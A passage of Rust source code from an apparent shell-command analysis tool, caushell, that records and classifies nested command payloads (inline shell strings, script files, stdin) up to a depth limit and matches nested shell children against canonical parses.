) -> InvocationRuntimeContext {
    let mut context = InvocationRuntimeContext::new().with_shell_kind(parsed.shell_kind);

    if pipeline_upstream_exists(parsed, command_index, command) {
        context = context.with_stdin_payload_available();
    }

    if explicit_stdin_payload_available(parsed, command_index) {
        context = context.with_stdin_payload_available();
    }

    if external_stdin_payload_available && !pipeline_upstream_exists(parsed, command_index, command)
    {
        context = context.with_stdin_payload_available();
    }

    context
}

fn explicit_stdin_payload_available(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
) -> bool {
    parsed.redirections.iter().any(|redirection| {
        redirection_parent_command_index(parsed, redirection) == Some(command_index)
            && redirection_targets_stdin_payload(redirection)
    })
}

fn pipeline_upstream_exists(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    _command: &caushell_parse::CommandFact,
) -> bool {
    pipeline_has_upstream(parsed, command_index)
}

fn derived_invocation_node_id(
    session_id: &caushell_types::SessionId,
    sequence_no: caushell_types::CommandSequenceNo,
    record_id: usize,
    derived_command_index: usize,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!(
        "derived:{}:{}:{}:{}",
        session_id.0.as_str(),
        sequence_no.0,
        record_id,
        derived_command_index,
    ))
}

fn dispatch_derived_invocation_node_id(
    session_id: &caushell_types::SessionId,
    sequence_no: caushell_types::CommandSequenceNo,
    source_command_index: usize,
    dispatch_index: usize,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!(
        "derived-dispatch:{}:{}:{}:{}",
        session_id.0.as_str(),
        sequence_no.0,
        source_command_index,
        dispatch_index,
    ))
}

fn alias_derived_invocation_node_id(
    session_id: &caushell_types::SessionId,
    sequence_no: caushell_types::CommandSequenceNo,
    source_command_index: usize,
    alias_hop_index: usize,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!(
        "derived-alias:{}:{}:{}:{}",
        session_id.0.as_str(),
        sequence_no.0,
        source_command_index,
        alias_hop_index,
    ))
}

fn function_derived_invocation_node_id(
    session_id: &caushell_types::SessionId,
    sequence_no: caushell_types::CommandSequenceNo,
    source_command_index: usize,
    derived_command_index: usize,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!(
        "derived-function:{}:{}:{}:{}",
        session_id.0.as_str(),
        sequence_no.0,
        source_command_index,
        derived_command_index,
    ))
}

fn nested_parent_node_id(
    _request: &caushell_types::CheckRequest,
    parent_ref: &NestedPayloadParentRef,
) -> Option<caushell_graph::NodeId> {
    match parent_ref {
        NestedPayloadParentRef::RootCommand { .. } => None,
        NestedPayloadParentRef::DerivedInvocation { node_id } => Some(node_id.clone()),
    }
}

fn nested_language_evidence(
    language: caushell_profile::PayloadLanguage,
) -> NestedPayloadLanguageEvidence {
    match language {
        caushell_profile::PayloadLanguage::Opaque => NestedPayloadLanguageEvidence::Opaque,
        caushell_profile::PayloadLanguage::Bash => NestedPayloadLanguageEvidence::Bash,
        caushell_profile::PayloadLanguage::Sh => NestedPayloadLanguageEvidence::Sh,
        caushell_profile::PayloadLanguage::Dash => NestedPayloadLanguageEvidence::Dash,
        caushell_profile::PayloadLanguage::Python => NestedPayloadLanguageEvidence::Python,
        caushell_profile::PayloadLanguage::Perl => NestedPayloadLanguageEvidence::Perl,
        caushell_profile::PayloadLanguage::Javascript => NestedPayloadLanguageEvidence::Javascript,
        caushell_profile::PayloadLanguage::SqliteCli => NestedPayloadLanguageEvidence::SqliteCli,
        caushell_profile::PayloadLanguage::MysqlCli => NestedPayloadLanguageEvidence::MysqlCli,
    }
}

fn nested_language_string(language: caushell_profile::PayloadLanguage) -> String {
    match language {
        caushell_profile::PayloadLanguage::Opaque => "opaque",
        caushell_profile::PayloadLanguage::Bash => "bash",
        caushell_profile::PayloadLanguage::Sh => "sh",
        caushell_profile::PayloadLanguage::Dash => "dash",
        caushell_profile::PayloadLanguage::Python => "python",
        caushell_profile::PayloadLanguage::Perl => "perl",
        caushell_profile::PayloadLanguage::Javascript => "javascript",
        caushell_profile::PayloadLanguage::SqliteCli => "sqlite_cli",
        caushell_profile::PayloadLanguage::MysqlCli => "mysql_cli",
    }
    .to_string()
}

fn nested_source_evidence(source: caushell_profile::PayloadSource) -> NestedPayloadSourceEvidence {
    match source {
        caushell_profile::PayloadSource::InlineString => NestedPayloadSourceEvidence::InlineString,
        caushell_profile::PayloadSource::ScriptFileRef => {
            NestedPayloadSourceEvidence::ScriptFileRef
        }
        caushell_profile::PayloadSource::Stdin => NestedPayloadSourceEvidence::Stdin,
        caushell_profile::PayloadSource::Interactive => NestedPayloadSourceEvidence::Interactive,
        caushell_profile::PayloadSource::DynamicReference => {
            NestedPayloadSourceEvidence::DynamicReference
        }
    }
}

fn nested_source_string(source: caushell_profile::PayloadSource) -> String {
    match source {
        caushell_profile::PayloadSource::InlineString => "inline_string",
        caushell_profile::PayloadSource::ScriptFileRef => "script_file_ref",
        caushell_profile::PayloadSource::Stdin => "stdin",
        caushell_profile::PayloadSource::Interactive => "interactive",
        caushell_profile::PayloadSource::DynamicReference => "dynamic_reference",
    }
    .to_string()
}

fn nested_origin_evidence(
    origin: &caushell_profile::RecursivePayloadOrigin,
) -> NestedPayloadOriginEvidence {
    match origin {
        caushell_profile::RecursivePayloadOrigin::NativeChildShell { slot } => {
            NestedPayloadOriginEvidence::NativeChildShell {
                slot_name: slot.as_str().to_string(),
            }
        }
        caushell_profile::RecursivePayloadOrigin::Parameter { slot } => {
            NestedPayloadOriginEvidence::Parameter {
                slot_name: slot.as_str().to_string(),
            }
        }
        caushell_profile::RecursivePayloadOrigin::FormImplicitInput => {
            NestedPayloadOriginEvidence::FormImplicitInput
        }
        caushell_profile::RecursivePayloadOrigin::ConfigDefinedTask {
            config_path,
            task_name,
        } => NestedPayloadOriginEvidence::ConfigDefinedTask {
            config_path: config_path.clone(),
            task_name: task_name.clone(),
        },
    }
}

fn nested_origin_kind_string(origin: &caushell_profile::RecursivePayloadOrigin) -> String {
    match origin {
        caushell_profile::RecursivePayloadOrigin::Parameter { .. } => "parameter",
        caushell_profile::RecursivePayloadOrigin::NativeChildShell { .. } => "native_child_shell",
        caushell_profile::RecursivePayloadOrigin::FormImplicitInput => "form_implicit_input",
        caushell_profile::RecursivePayloadOrigin::ConfigDefinedTask { .. } => "config_defined_task",
    }
    .to_string()
}

fn nested_origin_slot(origin: &caushell_profile::RecursivePayloadOrigin) -> Option<String> {
    match origin {
        caushell_profile::RecursivePayloadOrigin::Parameter { slot }
        | caushell_profile::RecursivePayloadOrigin::NativeChildShell { slot } => {
            Some(slot.as_str().to_string())
        }
        caushell_profile::RecursivePayloadOrigin::FormImplicitInput => None,
        caushell_profile::RecursivePayloadOrigin::ConfigDefinedTask {
            config_path,
            task_name,
        } => Some(format!("{config_path}#{task_name}")),
    }
}

fn nested_input_evidence(
    input: &caushell_profile::RecursivePayloadInput,
) -> NestedPayloadInputEvidence {
    match input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { fragments } => {
            NestedPayloadInputEvidence::ArgumentFragments {
                text: caushell_profile::joined_recursive_payload_text(fragments),
                fragments: fragments
                    .iter()
                    .map(|fragment| NestedPayloadInputFragmentEvidence {
                        text: fragment.text.clone(),
                        quoted: fragment.quoted,
                        node_kind: fragment.node_kind.clone(),
                    })
                    .collect(),
            }
        }
        caushell_profile::RecursivePayloadInput::ImplicitInput { source, .. } => {
            NestedPayloadInputEvidence::ImplicitInput {
                source: source.to_caushell_types_implicit_input_source(),
            }
        }
        caushell_profile::RecursivePayloadInput::LiteralText { text } => {
            NestedPayloadInputEvidence::LiteralText { text: text.clone() }
        }
    }
}

fn nested_input_kind_string(input: &caushell_profile::RecursivePayloadInput) -> String {
    match input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { .. } => "argument_fragments",
        caushell_profile::RecursivePayloadInput::ImplicitInput { .. } => "implicit_input",
        caushell_profile::RecursivePayloadInput::LiteralText { .. } => "literal_text",
    }
    .to_string()
}

fn nested_input_text(input: &caushell_profile::RecursivePayloadInput) -> Option<String> {
    match input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { fragments } => {
            Some(caushell_profile::joined_recursive_payload_text(fragments))
        }
        caushell_profile::RecursivePayloadInput::ImplicitInput { .. } => None,
        caushell_profile::RecursivePayloadInput::LiteralText { text } => Some(text.clone()),
    }
}

fn nested_input_fragments(
    input: &caushell_profile::RecursivePayloadInput,
) -> Vec<NestedPayloadInputFragmentSnapshot> {
    match input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { fragments } => fragments
            .iter()
            .map(|fragment| NestedPayloadInputFragmentSnapshot {
                text: fragment.text.clone(),
                quoted: fragment.quoted,
                node_kind: fragment.node_kind.clone(),
            })
            .collect(),
        caushell_profile::RecursivePayloadInput::ImplicitInput { .. }
        | caushell_profile::RecursivePayloadInput::LiteralText { .. } => Vec::new(),
    }
}

fn nested_input_source(
    input: &caushell_profile::RecursivePayloadInput,
) -> Option<TypedImplicitInputSource> {
    match input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { .. } => None,
        caushell_profile::RecursivePayloadInput::ImplicitInput { source, .. } => {
            Some(source.to_caushell_types_implicit_input_source())
        }
        caushell_profile::RecursivePayloadInput::LiteralText { .. } => None,
    }
}

fn nested_resolution_kind_string(resolution: &NestedPayloadResolution) -> String {
    match resolution {
        NestedPayloadResolution::ModeledLanguage => "modeled_language",
        NestedPayloadResolution::Parsed { .. } => "parsed",
        NestedPayloadResolution::TruncatedByDepthBudget { .. } => "truncated_by_depth_budget",
        NestedPayloadResolution::RequiresRuntimeInput { .. } => "requires_runtime_input",
        NestedPayloadResolution::RequiresImplicitInput { .. } => "requires_implicit_input",
        NestedPayloadResolution::UnsupportedLanguage => "unsupported_language",
        NestedPayloadResolution::ParseFailed { .. } => "parse_failed",
        NestedPayloadResolution::UnresolvedMaterialization { .. } => "unresolved_materialization",
    }
    .to_string()
}

fn nested_resolution_detail(resolution: &NestedPayloadResolution) -> Option<String> {
    match resolution {
        NestedPayloadResolution::ModeledLanguage => None,
        NestedPayloadResolution::Parsed { shell_kind, parsed } => Some(format!(
            "shell_kind={shell_kind:?};command_count={}",
            parsed.commands.len()
        )),
        NestedPayloadResolution::TruncatedByDepthBudget {
            max_depth,
            next_candidate_count,
        } => Some(format!(
            "max_depth={max_depth};next_candidate_count={next_candidate_count}",
        )),
        NestedPayloadResolution::RequiresRuntimeInput { .. } => None,
        NestedPayloadResolution::RequiresImplicitInput { source } => Some(format!("{source:?}")),
        NestedPayloadResolution::UnsupportedLanguage => None,
        NestedPayloadResolution::ParseFailed { shell_kind, error } => {
            Some(format!("shell_kind={shell_kind:?};error={error}"))
        }
        NestedPayloadResolution::UnresolvedMaterialization { materialization } => {
            Some(format!("{materialization:?}"))
        }
    }
}

fn nested_resolution_runtime_input_source(
    resolution: &NestedPayloadResolution,
) -> Option<RuntimeInputSource> {
    match resolution {
        NestedPayloadResolution::RequiresRuntimeInput { source } => Some(*source),
        NestedPayloadResolution::ModeledLanguage
        | NestedPayloadResolution::Parsed { .. }
        | NestedPayloadResolution::TruncatedByDepthBudget { .. }
        | NestedPayloadResolution::RequiresImplicitInput { .. }
        | NestedPayloadResolution::UnsupportedLanguage
        | NestedPayloadResolution::ParseFailed { .. }
        | NestedPayloadResolution::UnresolvedMaterialization { .. } => None,
    }
}

fn unresolved_reason_evidence(
    materialization: &ValueMaterialization,
) -> NestedPayloadUnresolvedReasonEvidence {
    match materialization {
        ValueMaterialization::Static
        | ValueMaterialization::ResolvedExactScalar { .. }
        | ValueMaterialization::ResolvedRuntimeProduced { .. }
        | ValueMaterialization::ResolvedShellWord { .. } => {
            panic!("unresolved_reason_evidence only accepts unresolved materialization states")
        }
        ValueMaterialization::MissingBinding { variable_name } => {
            NestedPayloadUnresolvedReasonEvidence::MissingBinding {
                variable_name: variable_name.clone(),
            }
        }
        ValueMaterialization::UnsupportedDynamicBinding {
            variable_name,
            repr,
            ..
        } => NestedPayloadUnresolvedReasonEvidence::UnsupportedDynamicBinding {
            variable_name: variable_name.clone(),
            repr: repr.clone(),
        },
        ValueMaterialization::UnsupportedDynamicText { text } => {
            NestedPayloadUnresolvedReasonEvidence::UnsupportedDynamicText { text: text.clone() }
        }
        ValueMaterialization::UnsafeUnquotedScalar {
            variable_name,
            value,
            ..
        } => NestedPayloadUnresolvedReasonEvidence::UnsafeUnquotedScalar {
            variable_name: variable_name.clone(),
            value: value.clone(),
        },
        ValueMaterialization::RequiresRuntimeInput { source, .. } => {
            NestedPayloadUnresolvedReasonEvidence::RequiresRuntimeInput { source: *source }
        }
        ValueMaterialization::RequiresImplicitInput { source } => {
            NestedPayloadUnresolvedReasonEvidence::RequiresImplicitInput {
                source: source.to_caushell_types_implicit_input_source(),
            }
        }
    }
}

fn unresolved_execution_payload_subtype(
    record: &NestedPayloadRecord,
    parsed_request: Option<&caushell_parse::ParsedCommandArtifact>,
) -> Option<UnresolvedExecutionPayloadSubtype> {
    if record
        .candidate
        .candidate
        .language
        .requires_opaque_execution_boundary()
    {
        return Some(UnresolvedExecutionPayloadSubtype::OpaqueNonShell);
    }
    if matches!(
        record.candidate.candidate.origin,
        RecursivePayloadOrigin::ConfigDefinedTask { .. }
            | RecursivePayloadOrigin::NativeChildShell { .. }
    ) {
        return Some(UnresolvedExecutionPayloadSubtype::UnknownPayloadShape);
    }
    Some(match &record.candidate.candidate.input {
        caushell_profile::RecursivePayloadInput::ArgumentFragments { .. } => {
            if !matches!(
                record.candidate.candidate.origin,
                caushell_profile::RecursivePayloadOrigin::Parameter { .. }
            ) {
                return None;
            }
            classify_argument_fragment_payload(record)
        }
        caushell_profile::RecursivePayloadInput::ImplicitInput { .. } => {
            if !matches!(
                record.candidate.candidate.origin,
                caushell_profile::RecursivePayloadOrigin::Parameter { .. }
                    | caushell_profile::RecursivePayloadOrigin::FormImplicitInput
            ) {
                return None;
            }
            classify_implicit_input_payload(record, parsed_request)
        }
        caushell_profile::RecursivePayloadInput::LiteralText { .. } => {
            if !matches!(
                record.candidate.candidate.origin,
                caushell_profile::RecursivePayloadOrigin::Parameter { .. }
                    | caushell_profile::RecursivePayloadOrigin::FormImplicitInput
            ) {
                return None;
            }
            UnresolvedExecutionPayloadSubtype::StaticHeredocLiteral
        }
    })
}

fn classify_argument_fragment_payload(
    record: &NestedPayloadRecord,
) -> UnresolvedExecutionPayloadSubtype {
    // A literal name/path can refer to an opaque executable body. It is not
    // an inline program merely because the reference itself is static.
    if record.candidate.candidate.source == caushell_profile::PayloadSource::DynamicReference {
        return UnresolvedExecutionPayloadSubtype::UnknownPayloadShape;
    }
    match &record.candidate.resolution {
        ValueMaterialization::Static => UnresolvedExecutionPayloadSubtype::StaticInlineLiteral,
        ValueMaterialization::ResolvedExactScalar { .. }
        | ValueMaterialization::ResolvedRuntimeProduced { .. }
        | ValueMaterialization::ResolvedShellWord { .. }
        | ValueMaterialization::MissingBinding { .. }
        | ValueMaterialization::UnsupportedDynamicBinding { .. }
        | ValueMaterialization::UnsupportedDynamicText { .. }
        | ValueMaterialization::RequiresImplicitInput { .. }
        | ValueMaterialization::UnsafeUnquotedScalar { .. } => {
            UnresolvedExecutionPayloadSubtype::DynamicInlinePayload
        }
        ValueMaterialization::RequiresRuntimeInput { origin, .. } => {
            if origin.is_some() {
                UnresolvedExecutionPayloadSubtype::DynamicInlinePayload
            } else {
                UnresolvedExecutionPayloadSubtype::RuntimeInputPayload
            }
        }
    }
}

fn classify_implicit_input_payload(
    record: &NestedPayloadRecord,
    _parsed_request: Option<&caushell_parse::ParsedCommandArtifact>,
) -> UnresolvedExecutionPayloadSubtype {
    let caushell_profile::RecursivePayloadInput::ImplicitInput { source, .. } =
        &record.candidate.candidate.input
    else {
        return UnresolvedExecutionPayloadSubtype::UnknownPayloadShape;
    };
    if source.to_runtime_input_source().is_some() {
        UnresolvedExecutionPayloadSubtype::RuntimeInputPayload
    } else if record.candidate.candidate.source == PayloadSource::ScriptFileRef {
        UnresolvedExecutionPayloadSubtype::ExternalStreamPayload
    } else if record.candidate.candidate.source == caushell_profile::PayloadSource::InlineString {
        UnresolvedExecutionPayloadSubtype::DynamicInlinePayload
    } else {
        UnresolvedExecutionPayloadSubtype::UnknownPayloadShape
    }
}

fn collect_nested_payload_records(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    summary: &caushell_types::SessionSummary,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    records: &[ResolvedCommandSeed],
    function_derived_commands: &[TopLevelFunctionDerivedCommand],
    function_derived_records: &[ResolvedCommandSeed],
    dispatch_derived_commands: &[TopLevelDispatchDerivedCommand],
    dispatch_derived_records: &[ResolvedCommandSeed],
    bindings: &SessionBindings,
    max_nested_parse_depth: u8,
) -> (
    Vec<NestedPayloadRecord>,
    BTreeMap<caushell_graph::NodeId, ProgramSourceContext>,
) {
    if max_nested_parse_depth == 0 {
        return (Vec::new(), BTreeMap::new());
    }
    let mut nested_records = Vec::new();
    let mut source_contexts = BTreeMap::new();
    let mut next_record_id = 0usize;
    let mut frontier = Vec::new();
    let request_cwd = caushell_runner::EffectiveCwd::known(request.shell_state_before.cwd());

    for record in records {
        let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
            continue;
        };

        let top_level_bindings = runtime_visible_variable_bindings_before_span(
            registry,
            summary,
            request,
            parsed_request,
            record.command_ref.span.start_byte,
            request.sequence_no,
        );
        let positional_args = parsed_request
            .commands
            .get(record.command_ref.command_index)
            .and_then(shell_dispatch_positional_arguments);
        for candidate in top_level_recursive_payload_candidates(
            registry,
            session,
            request,
            parsed_request,
            record.command_ref.command_index,
            &resolved.bound,
            &top_level_bindings,
            bindings,
            max_nested_parse_depth,
        ) {
            let root_command_index =
                top_level_unit_for_command(parsed_request, record.command_ref.command_index)
                    .map(|unit| unit.unit_index)
                    .unwrap_or(record.command_ref.command_index);

            frontier.push(FrontierEntry {
                parent_ref: NestedPayloadParentRef::RootCommand {
                    command_index: record.command_ref.command_index,
                },
                root_command_index,
                depth: 1,
                candidate,
                bindings: top_level_bindings.clone(),
                positional_args: positional_args.clone(),
                source_scopes: extended_payload_source_scopes(
                    &[],
                    parsed_request,
                    record.command_ref.command_index,
                    bindings,
                    &request_cwd,
                ),
                scope_entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    parsed_request,
                    record.command_ref.command_index,
                    bindings,
                    &request_cwd,
                ),
            });
        }

        let top_level_bindings = runtime_visible_variable_bindings_before_span(
            registry,
            summary,
            request,
            parsed_request,
            record.command_ref.span.start_byte,
            request.sequence_no,
        );
        for candidate in script_file_payload_candidates_from_prior_literal_writes(
            registry,
            session,
            request,
            parsed_request,
            record,
            resolved,
            &top_level_bindings,
            bindings,
            max_nested_parse_depth,
        ) {
            let root_command_index =
                top_level_unit_for_command(parsed_request, record.command_ref.command_index)
                    .map(|unit| unit.unit_index)
                    .unwrap_or(record.command_ref.command_index);

            frontier.push(FrontierEntry {
                parent_ref: NestedPayloadParentRef::RootCommand {
                    command_index: record.command_ref.command_index,
                },
                root_command_index,
                depth: 1,
                candidate,
                bindings: top_level_bindings.clone(),
                positional_args: positional_args.clone(),
                source_scopes: extended_payload_source_scopes(
                    &[],
                    parsed_request,
                    record.command_ref.command_index,
                    bindings,
                    &request_cwd,
                ),
                scope_entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    parsed_request,
                    record.command_ref.command_index,
                    bindings,
                    &request_cwd,
                ),
            });
        }
    }

    for (command, record) in function_derived_commands
        .iter()
        .zip(function_derived_records.iter())
    {
        let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
            continue;
        };

        let call_cwd = source_payload_cwd(
            registry,
            request,
            parsed_request,
            command.source_command_index,
            bindings,
            &request_cwd,
        );
        let call_scopes = extended_payload_source_scopes(
            &[],
            parsed_request,
            command.source_command_index,
            bindings,
            &request_cwd,
        );

        for candidate in recursive_payload_candidates_for_scoped_command(
            registry,
            session,
            request,
            &command.parsed_body,
            command.derived_command_index,
            &resolved.bound,
            &command.bindings,
            &command.bindings,
            max_nested_parse_depth,
        ) {
            let root_command_index =
                top_level_unit_for_command(parsed_request, command.source_command_index)
                    .map(|unit| unit.unit_index)
                    .unwrap_or(command.source_command_index);

            frontier.push(FrontierEntry {
                parent_ref: NestedPayloadParentRef::DerivedInvocation {
                    node_id: record.source_node_id.clone(),
                },
                root_command_index,
                depth: 1,
                candidate,
                bindings: command.bindings.clone(),
                positional_args: shell_dispatch_positional_arguments(&command.command),
                scope_entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    &command.parsed_body,
                    command.derived_command_index,
                    &command.scope_base_bindings,
                    &call_cwd,
                ),
                source_scopes: extended_payload_source_scopes(
                    &call_scopes,
                    &command.parsed_body,
                    command.derived_command_index,
                    &command.scope_base_bindings,
                    &call_cwd,
                ),
            });
        }
    }

    for (command, record) in dispatch_derived_commands
        .iter()
        .zip(dispatch_derived_records.iter())
    {
        let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
            continue;
        };

        let mut candidates = recursive_payload_candidates_for_scoped_command(
            registry,
            session,
            request,
            parsed_request,
            command.source_command_index,
            &resolved.bound,
            &command.bindings,
            bindings,
            max_nested_parse_depth,
        );
        candidates.extend(script_file_payload_candidates_from_literal_writes(
            registry,
            session,
            request,
            resolved,
            &command.bindings,
            parsed_request,
            command.source_command_index,
            bindings,
            &command.parent_node_id,
            max_nested_parse_depth,
            None,
        ));

        for candidate in candidates {
            let root_command_index =
                top_level_unit_for_command(parsed_request, command.source_command_index)
                    .map(|unit| unit.unit_index)
                    .unwrap_or(command.source_command_index);

            frontier.push(FrontierEntry {
                parent_ref: NestedPayloadParentRef::DerivedInvocation {
                    node_id: record.source_node_id.clone(),
                },
                root_command_index,
                depth: 1,
                candidate,
                bindings: command.bindings.clone(),
                positional_args: shell_dispatch_positional_arguments(&command.command),
                source_scopes: extended_payload_source_scopes(
                    &[],
                    parsed_request,
                    command.source_command_index,
                    bindings,
                    &request_cwd,
                ),
                scope_entry_cwd: source_payload_cwd(
                    registry,
                    request,
                    parsed_request,
                    command.source_command_index,
                    bindings,
                    &request_cwd,
                ),
            });
        }
    }

    while let Some(entry) = frontier.pop() {
        let materialized = materialize_frontier_entry(&entry);
        let record_id = NestedPayloadRecordId(next_record_id);
        next_record_id += 1;
        source_contexts.insert(
            nested_payload_node_id(&request.session_id, request.sequence_no, record_id.0),
            ProgramSourceContext {
                entry_cwd: if matches!(
                    entry.candidate.origin,
                    RecursivePayloadOrigin::NativeChildShell { .. }
                ) {
                    caushell_runner::EffectiveCwd::Unknown
                } else {
                    entry.scope_entry_cwd.clone()
                },
                source_scopes: if matches!(
                    entry.candidate.origin,
                    RecursivePayloadOrigin::NativeChildShell { .. }
                ) {
                    Vec::new()
                } else {
                    entry.source_scopes.clone()
                },
            },
        );

        match &materialized.resolution {
            ValueMaterialization::Static
            | ValueMaterialization::ResolvedExactScalar { .. }
            | ValueMaterialization::ResolvedRuntimeProduced { .. }
            | ValueMaterialization::ResolvedShellWord { .. } => {
                let parse_result = parse_recursive_payload_candidate(&materialized.candidate);
                let record_bindings = if matches!(
                    entry.candidate.origin,
                    RecursivePayloadOrigin::NativeChildShell { .. }
                ) {
                    SessionBindings::new()
                } else {
                    entry
                        .positional_args
                        .as_deref()
                        .map(|args| shell_payload_session_bindings(&entry.bindings, args))
                        .unwrap_or_else(|| entry.bindings.clone())
                };
                let mut record = NestedPayloadRecord::from_parse_result(
                    record_id,
                    entry.parent_ref,
                    entry.root_command_index,
                    entry.depth,
                    record_bindings,
                    materialized.clone(),
                    parse_result,
                );
                if matches!(
                    materialized.candidate.origin,
                    RecursivePayloadOrigin::ConfigDefinedTask { .. }
                ) {
                    record.execution_cwd = Some(entry.scope_entry_cwd.clone());
                } else if matches!(
                    materialized.candidate.origin,
                    RecursivePayloadOrigin::NativeChildShell { .. }
                ) {
                    record.execution_cwd = Some(caushell_runner::EffectiveCwd::Unknown);
                }

                if let NestedPayloadResolution::Parsed { parsed, .. } = &mut record.resolution {
                    if let Some(positional_args) = entry.positional_args.as_deref() {
                        bind_shell_positional_arguments(parsed, positional_args);
                    }
                    let child_entries = collect_child_frontier_entries(
                        registry,
                        session,
                        request,
                        parsed,
                        &record.bindings,
                        &entry.scope_entry_cwd,
                        &entry.source_scopes,
                        record_id,
                        entry.root_command_index,
                        entry.depth.saturating_add(1),
                        max_nested_parse_depth,
                    );

                    if entry.depth < max_nested_parse_depth {
                        frontier.extend(child_entries);
                    } else if !child_entries.is_empty() {
                        let expandable_child_count = child_entries
                            .iter()
                            .filter(|child| {
                                matches!(
                                    materialize_frontier_entry(child).resolution,
                                    ValueMaterialization::Static
                                        | ValueMaterialization::ResolvedExactScalar { .. }
                                        | ValueMaterialization::ResolvedRuntimeProduced { .. }
                                        | ValueMaterialization::ResolvedShellWord { .. }
                                )
                            })
                            .count();

                        for child_entry in child_entries {
                            let child_materialized = materialize_frontier_entry(&child_entry);
                            let child_record_id = NestedPayloadRecordId(next_record_id);
                            next_record_id += 1;

                            let resolution = match &child_materialized.resolution {
                                ValueMaterialization::Static
                                | ValueMaterialization::ResolvedExactScalar { .. }
                                | ValueMaterialization::ResolvedRuntimeProduced { .. }
                                | ValueMaterialization::ResolvedShellWord { .. } => {
                                    NestedPayloadResolution::TruncatedByDepthBudget {
                                        max_depth: max_nested_parse_depth,
                                        next_candidate_count: expandable_child_count,
                                    }
                                }
                                _ => NestedPayloadResolution::from_unresolved_materialization(
                                    child_materialized.resolution.clone(),
                                ),
                            };

                            nested_records.push(NestedPayloadRecord {
                                record_id: child_record_id,
                                parent_ref: child_entry.parent_ref,
                                root_command_index: child_entry.root_command_index,
                                depth: child_entry.depth,
                                bindings: child_entry.bindings,
                                candidate: child_materialized,
                                resolution,
                                execution_cwd: None,
                            });
                        }
                    }
                }

                nested_records.push(record);
            }
            _ => {
                nested_records.push(NestedPayloadRecord {
                    record_id,
                    parent_ref: entry.parent_ref,
                    root_command_index: entry.root_command_index,
                    depth: entry.depth,
                    bindings: entry.bindings,
                    candidate: materialized.clone(),
                    execution_cwd: None,
                    resolution: NestedPayloadResolution::from_unresolved_materialization(
                        materialized.resolution,
                    ),
                });
            }
        }
    }

    nested_records.sort_by_key(|record| record.record_id.0);
    (nested_records, source_contexts)
}

fn nested_payload_is_inline_shell_child(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    payload: &NestedPayloadRecord,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    top_level_records: &[ResolvedCommandSeed],
    function_commands: &[TopLevelFunctionDerivedCommand],
    function_records: &[ResolvedCommandSeed],
    dispatch_commands: &[TopLevelDispatchDerivedCommand],
    dispatch_records: &[ResolvedCommandSeed],
    nested_records: &[NestedPayloadRecord],
) -> bool {
    let candidate = &payload.candidate.candidate;
    if !matches!(
        candidate.language,
        PayloadLanguage::Sh | PayloadLanguage::Bash
    ) || candidate.source != PayloadSource::InlineString
    {
        return false;
    }

    let expected = &payload.candidate;
    let matches_canonical_shell =
        |resolved: &caushell_profile::ResolvedInvocationArtifact,
         bindings: &SessionBindings,
         parent_command: &caushell_parse::CommandFact| {
            if !matches!(resolved.normalized_command_name.as_str(), "sh" | "bash") {
                return false;
            }
            let Some((script, _, _)) = shell_payload_from_bound_invocation(resolved, bindings)
            else {
                return false;
            };
            let Ok(mut canonical_parse) = caushell_parse::parse_command(
                &script,
                if resolved.normalized_command_name.as_str() == "bash" {
                    caushell_types::ShellKind::Bash
                } else {
                    caushell_types::ShellKind::Sh
                },
            ) else {
                return false;
            };
            let positional_args =
                shell_dispatch_positional_arguments(parent_command).unwrap_or_default();
            bind_shell_positional_arguments(&mut canonical_parse, &positional_args);

            // Suppress a historical NestedPayload seed only when regenerating the
            // shell's typed payload from its resolved parent yields the same
            // candidate and parsed body that canonical frontier expansion uses.
            collect_recursive_payload_candidates(&resolved.bound)
                .into_iter()
                .filter(|candidate| {
                    candidate.language == expected.candidate.language
                        && candidate.source == PayloadSource::InlineString
                })
                .any(|candidate| {
                    let materialized =
                        materialize_recursive_payload_candidate(&candidate, bindings);
                    if materialized.candidate != expected.candidate
                        || materialized.resolution != expected.resolution
                    {
                        return false;
                    }
                    let caushell_profile::RecursivePayloadParseResult::Parsed(mut parsed) =
                        parse_recursive_payload_candidate(&materialized.candidate)
                    else {
                        return false;
                    };
                    bind_shell_positional_arguments(&mut parsed.artifact, &positional_args);
                    parsed.artifact == canonical_parse
                        && matches!(
                            &payload.resolution,
                            NestedPayloadResolution::Parsed { parsed, .. }
                                if parsed == &canonical_parse
                        )
                })
        };

    match &payload.parent_ref {
        NestedPayloadParentRef::RootCommand { command_index } => {
            let Some(seed) = top_level_records
                .iter()
                .find(|seed| seed.command_ref.command_index == *command_index)
            else {
                return false;
            };
            let ResolveInvocationArtifactResult::Resolved(resolved) = &seed.result else {
                return false;
            };
            let Some(command) = parsed_request.commands.get(*command_index) else {
                return false;
            };
            let bindings = runtime_visible_variable_bindings_before_span(
                registry,
                session.summary(),
                request,
                parsed_request,
                command.span.start_byte,
                request.sequence_no,
            );
            matches_canonical_shell(resolved, &bindings, command)
        }
        NestedPayloadParentRef::DerivedInvocation { node_id } => {
            if let Some((command, seed)) = dispatch_commands
                .iter()
                .zip(dispatch_records.iter())
                .find(|(_, seed)| seed.source_node_id == *node_id)
            {
                if let ResolveInvocationArtifactResult::Resolved(resolved) = &seed.result {
                    return matches_canonical_shell(resolved, &command.bindings, &command.command);
                }
                return false;
            }
            if let Some((command, seed)) = function_commands
                .iter()
                .zip(function_records.iter())
                .find(|(_, seed)| seed.source_node_id == *node_id)
            {
                if let ResolveInvocationArtifactResult::Resolved(resolved) = &seed.result {
